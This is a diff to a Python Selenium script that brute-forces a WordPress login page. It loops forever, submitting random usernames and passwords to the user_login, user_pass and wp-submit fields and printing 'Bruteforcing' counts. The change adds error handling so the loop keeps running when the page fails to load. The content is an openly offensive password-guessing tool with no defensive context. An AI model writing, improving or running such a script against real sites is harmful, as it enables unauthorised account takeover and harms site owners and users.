@@ -1,5 +1,6 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
+from selenium.common.exceptions import NoSuchElementException
 import random
 import time
 
@@ -27,13 +28,18 @@ driver.implicitly_wait(2)
 
 i = 0
 while True:
-    print("Bruteforcing #{i}")
-    driver.find_element(by=By.ID, value="user_login").send_keys(NamesPickRandom())
-    time.sleep(1)
-    driver.find_element(by=By.ID, value="user_pass").send_keys(PasswordPickRandom())
-    time.sleep(1)
-    driver.find_element(by=By.ID, value="wp-submit").click()
-    time.sleep(1)
+    try:
+        print(f"Bruteforcing #{i}")
+        driver.find_element(by=By.ID, value="user_login").send_keys(NamesPickRandom())
+        time.sleep(1)
+        driver.find_element(by=By.ID, value="user_pass").send_keys(PasswordPickRandom())
+        time.sleep(1)
+        driver.find_element(by=By.ID, value="wp-submit").click()
+        time.sleep(1)
+    except NoSuchElementException:
+    # Handle the "Element not found" exception
+        print("Website Failed to Load!")
+        
     i = i + 1
 
 driver.quit()
